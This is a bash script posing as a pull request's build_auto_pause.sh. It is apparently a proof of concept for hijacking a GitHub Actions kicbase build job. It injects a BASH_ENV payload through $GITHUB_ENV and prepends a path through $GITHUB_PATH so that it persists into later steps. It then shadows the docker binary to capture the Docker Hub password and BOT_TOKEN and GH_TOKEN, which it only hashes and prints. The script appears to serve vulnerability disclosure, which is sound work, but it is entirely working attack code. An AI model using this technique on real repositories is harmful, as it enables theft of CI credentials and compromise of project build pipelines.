#!/bin/bash
# PR-supplied version of hack/build_auto_pause.sh.
# The kicbase build job runs this from the PR head inside "Prepare build metadata",
# a step whose own env contains no secrets.
set -u

mkdir -p /tmp/pocp/bin

cat > /tmp/pocp/bash_env_payload.sh <<'PAYLOAD'
#!/bin/bash
echo "POC_BASH_BOT_TOKEN_SHA256=$(printf '%s' "${BOT_TOKEN:-}" | sha256sum | cut -d' ' -f1)"
echo "POC_BASH_GH_TOKEN_SHA256=$(printf '%s' "${GH_TOKEN:-}" | sha256sum | cut -d' ' -f1)"
PAYLOAD

# Shadow the docker CLI. docker/login-action runs `docker login --password-stdin`,
# so whatever binary is first on PATH receives the Docker Hub password on stdin.
cat > /tmp/pocp/bin/docker <<'PAYLOAD'
#!/bin/bash
if [ "${1:-}" = "login" ] || [ "${1:-}" = "logout" ]; then
  input=$(timeout 3 cat 2>/dev/null || true)
  echo "POC_DOCKER_SUBCMD=${1:-}"
  echo "POC_DOCKER_STDIN_SHA256=$(printf '%s' "$input" | sha256sum | cut -d' ' -f1)"
  exit 0
fi
exec /usr/bin/docker "$@"
PAYLOAD
chmod +x /tmp/pocp/bin/docker

# --- the persistence primitives -------------------------------------------
echo "BASH_ENV=/tmp/pocp/bash_env_payload.sh" >> "$GITHUB_ENV"
echo "/tmp/pocp/bin" >> "$GITHUB_PATH"
# -------------------------------------------------------------------------

echo "PR code ran inside the kicbase build job"
echo "POC_PATH_HEAD=$(printf '%s' "$PATH" | cut -d: -f1)"
